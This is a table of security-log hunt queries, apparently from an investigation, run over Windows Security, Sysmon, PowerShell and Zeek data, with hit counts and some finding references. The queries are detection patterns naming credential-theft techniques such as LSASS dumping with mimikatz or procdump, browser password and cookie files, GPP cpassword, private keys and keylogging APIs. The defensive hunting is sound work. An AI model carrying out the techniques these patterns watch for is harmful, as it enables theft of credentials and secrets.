| q-914c837a96 | check C054 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4656 OR event.code:4663 OR event.code:4670", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 10977 |  |
| q-1792649c63 | check C055 | aggregate | {"dataset": "windows.security", "field": "process.executable", "query": "event.code:4688 AND (process.command_line:*keylog* OR process.command_line:*hook* OR process.command_line:*GetAsyncKeyState*)", "time_from": null, "time_to": null, "size": 50, "sub_field"… | 0 |  |
| q-4a28389a5d | check C056 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*GetAsyncKeyState* OR win.ScriptBlockText:*keylog* OR win.ScriptBlockText:*SetWindowsHookEx*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "obse… | 0 |  |
| q-8977a4cf71 | check C057 | search | {"dataset": "windows.other", "query": "message:*keylog* OR message:*GetAsyncKeyState* OR message:*SetWindowsHookEx*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "proces… | 0 |  |
| q-086e0d4f8e | check C058 | aggregate | {"dataset": "zeek", "field": "zeek.service", "query": "event.action:conn", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 613 |  |
| q-3ff25303fe | check C059 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetObject", "query": "event.code:13 OR event.code:14", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 17541 |  |
| q-6d93e9bca2 | check C060 | aggregate | {"dataset": "windows.sysmon", "field": "win.SourceImage", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-99e3fe1d1f | check C061 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4656 OR event.code:4663 OR event.code:4670", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 10977 |  |
| q-0969b1efb8 | check C062 | aggregate | {"dataset": "windows.other", "field": "win.ServiceName", "query": "event.code:7045", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 5 |  |
| q-f4c77406ef | check C063 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*GetAsyncKeyState* OR win.ScriptBlockText:*keylog* OR win.ScriptBlockText:*SetWindowsHookEx* OR win.ScriptBlockText:*RegisterRawInputDevices*)", "time_from": null, "time_to": … | 0 |  |
| q-a6ea8bf18c | check C064 | aggregate | {"dataset": "zeek", "field": "zeek.service", "query": "event.action:conn", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 613 |  |
| q-98754c066c | check C065 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND (process.command_line:*Credential* OR process.command_line:*prompt* OR process.command_line:*consent*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 3 |  |
| q-f7270e8a8e | check C066 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*CredentialUIBroker* OR win.ScriptBlockText:*Windows.Forms* OR win.ScriptBlockText:*Get-Credential* OR win.ScriptBlockText:*ShowDialog*)", "time_from": null, "time_to": null, … | 2 |  |
| q-120405deb2 | check C067 | search | {"dataset": "windows.powershell", "query": "event.code:4103 OR event.code:4104", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line"… | 5494 |  |
| q-1ca2ea9493 | check C068 | aggregate | {"dataset": "windows.security", "field": "process.executable", "query": "event.code:4688 AND (process.command_line:*Credential* OR process.command_line:*consent*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 3 |  |
| q-4c1a53b96a | check C069 | search | {"dataset": "windows.other", "query": "message:*Credential* OR message:*consent*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_lin… | 2 | F12, F13 |
| q-bda9f0260a | check C070 | aggregate | {"dataset": "zeek", "field": "zeek.service", "query": "event.action:conn", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 613 |  |
| q-6afd63fe5b | check C071 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetFilename", "query": "event.code:11 AND (win.TargetFilename:*\\\\inetpub\\\\* OR win.TargetFilename:*.aspx OR win.TargetFilename:*.asp OR win.TargetFilename:*.php)", "time_from": null, "time_to": null, "size": 1… | 0 |  |
| q-fd189b05c7 | check C072 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND (process.command_line:*w3wp* OR process.command_line:*appcmd* OR process.command_line:*iisreset*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-582f6f73e3 | check C073 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4663 AND (win.ObjectName:*inetpub* OR win.ObjectName:*.aspx OR win.ObjectName:*.asp)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-3e2825e895 | check C074 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*inetpub* OR win.ScriptBlockText:*w3wp* OR win.ScriptBlockText:*IIS*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.datas… | 0 |  |
| q-76c74f9910 | check C075 | search | {"dataset": "windows.other", "query": "message:*inetpub* OR message:*w3wp* OR message:*IIS*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.… | 0 |  |
| q-4ea3f477dc | check C076 | aggregate | {"dataset": "zeek", "field": "url.original", "query": "event.action:http", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 62 |  |
| q-3cd382f4cd | check C077 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 39283 |  |
| q-4e7dad8acd | check C078 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-f9b06b757d | check C079 | aggregate | {"dataset": "windows.sysmon", "field": "win.ImageLoaded", "query": "event.code:7", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 20259 |  |
| q-6d0de60b27 | check C080 | search | {"dataset": "windows.sysmon", "query": "event.code:8", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "destinatio… | 95 |  |
| q-a08ebb03d2 | check C081 | aggregate | {"dataset": "windows.security", "field": "win.CallerProcessName", "query": "event.code:4656 AND win.ObjectType:*Process*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 13 |  |
| q-492f14a93e | check C082 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-fefd0cffa0 | check C083 | aggregate | {"dataset": "windows.security", "field": "source.ip", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-c1dac974d5 | check C084 | timeline | {"dataset": "windows.security", "query": "event.code:4625", "interval": "1m", "time_from": null, "time_to": null} | 0 |  |
| q-a702bf8e8b | check C085 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4771", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-22cbf05528 | check C086 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND (process.command_line:*net* OR process.command_line:*user* OR process.command_line:*pass*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 32 |  |
| q-45d476daf4 | check C087 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-f0ed195ec4 | check C088 | aggregate | {"dataset": "windows.security", "field": "win.LogonType", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-47a860e5f7 | check C089 | search | {"dataset": "windows.security", "query": "event.code:4625", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "desti… | 0 |  |
| q-d670411252 | check C090 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 447 |  |
| q-f783d49c8f | check C091 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetFilename", "query": "event.code:11", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 1649 |  |
| q-87f9dc48ff | check C092 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-7a93bb1473 | check C093 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4663 OR event.code:4656 OR event.code:4670", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 10977 |  |
| q-7a090a76bc | check C094 | aggregate | {"dataset": "windows.security", "field": "process.executable", "query": "event.code:4688", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 460 |  |
| q-ca926269b5 | check C095 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 0 |  |
| q-0fee0a8853 | check C096 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4771", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 0 |  |
| q-bb4e45783d | check C097 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4648", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 15 |  |
| q-44da297a17 | check C098 | timeline | {"dataset": "windows.security", "query": "event.code:4625 OR event.code:4771", "interval": "1m", "time_from": null, "time_to": null} | 0 |  |
| q-91e5ab1d91 | check C099 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 0 |  |
| q-a0baced8cc | check C100 | aggregate | {"dataset": "windows.security", "field": "source.ip", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 0 |  |
| q-b2e7f4d7ea | check C101 | search | {"dataset": "windows.security", "query": "event.code:4625", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "desti… | 0 |  |
| q-df96eba8bb | check C102 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-4774fcca20 | check C103 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-2569216126 | check C104 | aggregate | {"dataset": "windows.security", "field": "win.LogonType", "query": "event.code:4624", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 297 |  |
| q-34a69868e2 | check C105 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4624", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 297 |  |
| q-b3581bb2b7 | check C106 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*lsass* OR win.ScriptBlockText:*mimikatz* OR win.ScriptBlockText:*sekurlsa* OR win.ScriptBlockText:*credential*)", "time_from": null, "time_to": null, "fields": ["@timestamp",… | 2 |  |
| q-fa5393cbae | check C107 | search | {"dataset": "windows.other", "query": "message:*lsass* OR message:*credential* OR message:*smartcard*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable",… | 2 |  |
| q-ba5de79839 | check C108 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetFilename", "query": "event.code:11 AND (win.TargetFilename:*\\\\*.lnk OR win.TargetFilename:*\\\\*.url OR win.TargetFilename:*\\\\*.scf OR win.TargetFilename:*\\\\*.library-ms)", "time_from": null, "time_to": n… | 3 |  |
| q-40970a35db | check C109 | aggregate | {"dataset": "windows.sysmon", "field": "destination.ip", "query": "event.code:3 AND (destination.port:139 OR destination.port:445)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 66 |  |
| q-73840eddb8 | check C110 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4663 OR event.code:4656 OR event.code:4670", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 10977 |  |
| q-778500412a | check C111 | aggregate | {"dataset": "windows.security", "field": "win.ShareName", "query": "event.code:5140 OR event.code:5145", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 163 |  |
| q-26ca2d0bde | check C112 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*WebDAV* OR win.ScriptBlockText:*NTLM* OR win.ScriptBlockText:*Responder* OR win.ScriptBlockText:*PetitPotam* OR win.ScriptBlockText:*\\\\\\\\)", "time_from": null, "time_to":… | 0 |  |
| q-85967ff43f | check C113 | search | {"dataset": "windows.other", "query": "message:*WebDAV* OR message:*NTLM* OR message:*445*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.c… | 1 |  |
| q-5444ae296d | check C114 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-a6da0c6775 | check C115 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-e522fdaa3d | check C116 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4768 OR event.code:4769 OR event.code:4770", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 42 |  |
| q-d924de5130 | check C117 | aggregate | {"dataset": "windows.security", "field": "win.ServiceName", "query": "event.code:4769", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 28 |  |
| q-929de46042 | check C118 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*Invoke-Mimikatz* OR win.ScriptBlockText:*sekurlsa* OR win.ScriptBlockText:*lsass* OR win.ScriptBlockText:*procdump*)", "time_from": null, "time_to": null, "fields": ["@timest… | 0 |  |
| q-e23d328837 | check C119 | search | {"dataset": "windows.other", "query": "message:*lsass* OR message:*mimikatz* OR message:*procdump*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "p… | 0 |  |
| q-53455f4049 | check C120 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:10 AND (win.TargetImage:*chrome* OR win.TargetImage:*firefox* OR win.TargetImage:*iexplore* OR win.TargetImage:*msedge*)", "time_from": null, "time_to": null, "size": 50, "sub_fi… | 0 |  |
| q-85322ea538 | check C121 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetFilename", "query": "event.code:11 AND (win.TargetFilename:*Cookies* OR win.TargetFilename:*Login Data* OR win.TargetFilename:*Web Data*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 162 |  |
| q-49b44938d6 | check C122 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetFilename", "query": "event.code:2 AND (win.TargetFilename:*Cookies* OR win.TargetFilename:*Login Data*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-e1a5124004 | check C123 | aggregate | {"dataset": "windows.security", "field": "process.executable", "query": "event.code:4688 AND (process.command_line:*Cookies* OR process.command_line:*Login Data* OR process.command_line:*chrome* OR process.command_line:*firefox*)", "time_from": null, "time_to"… | 4 |  |
| q-425af2d70e | check C124 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*Cookies* OR win.ScriptBlockText:*Login Data* OR win.ScriptBlockText:*chrome* OR win.ScriptBlockText:*firefox*)", "time_from": null, "time_to": null, "fields": ["@timestamp", … | 13 |  |
| q-52ba109b28 | check C125 | search | {"dataset": "windows.other", "query": "message:*Cookies* OR message:*Login Data* OR message:*chrome*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", … | 3 |  |
| q-ba44adf4ca | check C126 | aggregate | {"dataset": "windows.sysmon", "field": "registry.path", "query": "event.code:13 AND (registry.path:*Password* OR registry.path:*Credential* OR registry.path:*Winlogon* OR registry.path:*SAM*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 26 |  |
| q-3b59ff7007 | check C127 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetFilename", "query": "event.code:11 AND (win.TargetFilename:*unattend* OR win.TargetFilename:*web.config* OR win.TargetFilename:*.config OR win.TargetFilename:*passwords* OR win.TargetFilename:*.kdbx)", "time_fr… | 2 |  |
| q-85379ad738 | check C128 | aggregate | {"dataset": "windows.security", "field": "process.executable", "query": "event.code:4688 AND (process.command_line:*reg* OR process.command_line:*findstr* OR process.command_line:*password* OR process.command_line:*credential*)", "time_from": null, "time_to": … | 6 |  |
| q-9ef0e528da | check C129 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*password* OR win.ScriptBlockText:*credential* OR win.ScriptBlockText:*Get-ChildItem* OR win.ScriptBlockText:*findstr*)", "time_from": null, "time_to": null, "fields": ["@time… | 3 |  |
| q-32bbd259fd | check C130 | search | {"dataset": "windows.other", "query": "message:*password* OR message:*credential* OR message:*SAM*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "p… | 3 |  |
| q-c338d4ad9a | check C131 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetFilename", "query": "event.code:11 AND (win.TargetFilename:*.txt OR win.TargetFilename:*.config OR win.TargetFilename:*.xml OR win.TargetFilename:*.ini OR win.TargetFilename:*.ps1)", "time_from": null, "time_to… | 72 |  |
| q-12cee10d6e | check C132 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND (process.command_line:*password* OR process.command_line:*credential* OR process.command_line:*findstr* OR process.command_line:*type *)", "time_from": null, "time_to": nul… | 447 |  |
| q-dc0e5c7e67 | check C133 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4663 AND (win.ObjectName:*.txt OR win.ObjectName:*.config OR win.ObjectName:*.xml OR win.ObjectName:*.ini)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-d32c0c2fa7 | check C134 | aggregate | {"dataset": "windows.security", "field": "win.LogonType", "query": "event.code:4624 OR event.code:4648", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 312 |  |
| q-feab3e719c | check C135 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*Get-Content* OR win.ScriptBlockText:*Select-String* OR win.ScriptBlockText:*password* OR win.ScriptBlockText:*credential*)", "time_from": null, "time_to": null, "fields": ["@… | 3 |  |
| q-23ad6f42a1 | check C136 | search | {"dataset": "windows.other", "query": "message:*.config OR message:*.txt OR message:*password*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "proce… | 0 |  |
| q-2971cd1e86 | check C137 | aggregate | {"dataset": "windows.sysmon", "field": "registry.path", "query": "event.code:13 AND (registry.path:*Password* OR registry.path:*Credential* OR registry.path:*Login* OR registry.path:*Secret*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 20 |  |
| q-e02785ea52 | check C138 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND (process.command_line:*reg*query* OR process.command_line:*reg.exe* OR process.command_line:*Password* OR process.command_line:*Credential*)", "time_from": null, "time_to":… | 0 |  |
| q-2a8ea59174 | check C139 | aggregate | {"dataset": "windows.powershell", "field": "host.name", "query": "event.code:4104 AND (win.ScriptBlockText:*Password* OR win.ScriptBlockText:*Credential* OR win.ScriptBlockText:*reg*query* OR win.ScriptBlockText:*HKLM*)", "time_from": null, "time_to": null, "s… | 5 |  |
| q-279b87582b | check C140 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4663 AND (win.ObjectName:*Password* OR win.ObjectName:*Credential* OR win.ObjectName:*Secret*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-fac86efae9 | check C141 | search | {"dataset": "windows.other", "query": "event.code:1 OR event.code:10 OR event.code:11", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.comman… | 10 |  |
| q-feb830689c | check C142 | aggregate | {"dataset": "windows.powershell", "field": "host.name", "query": "event.code:4104 AND (win.ScriptBlockText:*history* OR win.ScriptBlockText:*Get-History* OR win.ScriptBlockText:*ConsoleHost_history* OR win.ScriptBlockText:*PSReadLine*)", "time_from": null, "ti… | 0 |  |
| q-abcf41e404 | check C143 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND (process.command_line:*history* OR process.command_line:*Get-History* OR process.command_line:*ConsoleHost_history*)", "time_from": null, "time_to": null, "size": 50, "sub_… | 0 |  |
| q-3beb7d384f | check C144 | aggregate | {"dataset": "windows.sysmon", "field": "file.path", "query": "event.code:11 AND (file.path:*ConsoleHost_history* OR file.path:*history*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-89141fedd5 | check C145 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4663 AND (win.ObjectName:*history* OR win.ObjectName:*ConsoleHost_history*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-3cb875b8cc | check C146 | search | {"dataset": "windows.other", "query": "event.code:1 OR event.code:11", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.… | 7 | F28 |
| q-9d502cc348 | check C147 | aggregate | {"dataset": "windows.sysmon", "field": "file.path", "query": "event.code:11 AND (file.path:*.pfx OR file.path:*.pem OR file.path:*.key OR file.path:*.p12 OR file.path:*.ppk OR file.path:*.cer OR file.path:*.pgp OR file.path:*.gpg)", "time_from": null, "time_to… | 1 |  |
| q-4901e621d3 | check C148 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND (process.command_line:*.pfx OR process.command_line:*.pem OR process.command_line:*.key OR process.command_line:*.p12 OR process.command_line:*.ppk)", "time_from": null, "t… | 0 |  |
| q-7b0a9de24d | check C149 | aggregate | {"dataset": "windows.security", "field": "win.RelativeTargetName", "query": "event.code:5145 AND (win.RelativeTargetName:*.pfx OR win.RelativeTargetName:*.pem OR win.RelativeTargetName:*.key OR win.RelativeTargetName:*.p12 OR win.RelativeTargetName:*.ppk OR wi… | 0 |  |
| q-c3b11331fe | check C150 | aggregate | {"dataset": "windows.powershell", "field": "host.name", "query": "event.code:4104 AND (win.ScriptBlockText:*.pfx OR win.ScriptBlockText:*.pem OR win.ScriptBlockText:*.p12 OR win.ScriptBlockText:*.ppk OR win.ScriptBlockText:*Export-PfxCertificate* OR win.Script… | 1 |  |
| q-503e345681 | check C151 | search | {"dataset": "windows.other", "query": "event.code:11 OR event.code:1", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.… | 7 |  |
| q-2f7bd8525b | check C152 | aggregate | {"dataset": "windows.powershell", "field": "host.name", "query": "event.code:4104 AND (win.ScriptBlockText:*Groups.xml* OR win.ScriptBlockText:*cpassword* OR win.ScriptBlockText:*gpprefdecrypt* OR win.ScriptBlockText:*Get-GPPPassword* OR win.ScriptBlockText:*S… | 0 |  |
| q-4e4d966356 | check C153 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND (process.command_line:*Groups.xml* OR process.command_line:*cpassword* OR process.command_line:*SYSVOL* OR process.command_line:*gpprefdecrypt*)", "time_from": null, "time_… | 0 |  |
| q-5de8514033 | check C154 | aggregate | {"dataset": "windows.security", "field": "win.RelativeTargetName", "query": "event.code:5145 AND (win.RelativeTargetName:*Groups.xml* OR win.RelativeTargetName:*SYSVOL* OR win.RelativeTargetName:*.xml)", "time_from": null, "time_to": null, "size": 50, "sub_fie… | 0 |  |
| q-d70a8521ee | check C155 | aggregate | {"dataset": "windows.sysmon", "field": "file.path", "query": "event.code:11 AND (file.path:*Groups.xml* OR file.path:*SYSVOL*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-22c673dcf9 | check C156 | search | {"dataset": "windows.other", "query": "event.code:1 OR event.code:11", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.… | 7 |  |
| q-3dd4197994 | check C157 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10 AND (win.TargetImage:*lsass.exe OR win.TargetImage:*lsass*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-e41c1b457e | check C158 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:10 AND (win.TargetImage:*lsass.exe OR win.TargetImage:*lsass*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-a0b46111de | check C159 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND (process.command_line:*procdump* OR process.command_line:*mimikatz* OR process.command_line:*sekurlsa* OR process.command_line:*lsass* OR process.command_line:*comsvcs* OR … | 1 |  |
| q-38c34b84ca | check C160 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4663 AND (win.ObjectName:*lsass* OR win.ObjectName:*SAM* OR win.ObjectName:*SECURITY* OR win.ObjectName:*NTDS*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 6 |  |
| q-b4ff93fbc9 | check C161 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4624 AND win.LogonType:9", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-29f83045d0 | check C162 | aggregate | {"dataset": "windows.powershell", "field": "host.name", "query": "event.code:4104 AND (win.ScriptBlockText:*lsass* OR win.ScriptBlockText:*mimikatz* OR win.ScriptBlockText:*sekurlsa* OR win.ScriptBlockText:*MiniDump* OR win.ScriptBlockText:*Credential*)", "tim… | 3 |  |
| q-1b151e876e | check C163 | search | {"dataset": "windows.other", "query": "event.code:10 OR event.code:1", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.… | 6 |  |
| q-e200574f20 | check C164 | aggregate | {"dataset": "windows.sysmon", "field": "file.path", "query": "event.code:11 AND (file.path:*Login Data* OR file.path:*Cookies* OR file.path:*Web Data* OR file.path:*Local State*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-c42d1745ef | check C165 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND (process.command_line:*Login Data* OR process.command_line:*Local State* OR process.command_line:*Cookies* OR process.command_line:*Web Data*)", "time_from": null, "time_to… | 0 |  |
| q-82f52f095d | check C166 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4663 AND (win.ObjectName:*Login Data* OR win.ObjectName:*Local State* OR win.ObjectName:*Cookies* OR win.ObjectName:*Web Data*)", "time_from": null, "time_to": null, "size": 50, "s… | 0 |  |
| q-d36eb4bd48 | check C167 | aggregate | {"dataset": "windows.powershell", "field": "host.name", "query": "event.code:4104 AND (win.ScriptBlockText:*Login Data* OR win.ScriptBlockText:*Local State* OR win.ScriptBlockText:*Cookies* OR win.ScriptBlockText:*sqlite*)", "time_from": null, "time_to": null,… | 0 |  |
| q-41b1868bfc | check C168 | search | {"dataset": "windows.other", "query": "event.code:11 OR event.code:1", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.… | 7 |  |
| q-a48ea3327c | check C169 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND (process.command_line:*vault* OR process.command_line:*credential* OR process.command_line:*cmdkey*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-7b210e44ea | check C170 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND (win.TargetImage:*lsass* OR win.TargetImage:*vault* OR win.TargetImage:*credential*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.… | 326 |  |
| q-0ba20a408d | check C171 | aggregate | {"dataset": "windows.security", "field": "process.executable", "query": "event.code:4688 AND (process.command_line:*vault* OR process.command_line:*cmdkey* OR process.command_line:*credential* OR process.command_line:*CredentialManager*)", "time_from": null, "… | 0 |  |
| q-31b16adff1 | check C172 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*CredentialManager* OR win.ScriptBlockText:*vault* OR win.ScriptBlockText:*cmdkey* OR win.ScriptBlockText:*Get-StoredCredential*)", "time_from": null, "time_to": null, "fields… | 0 |  |
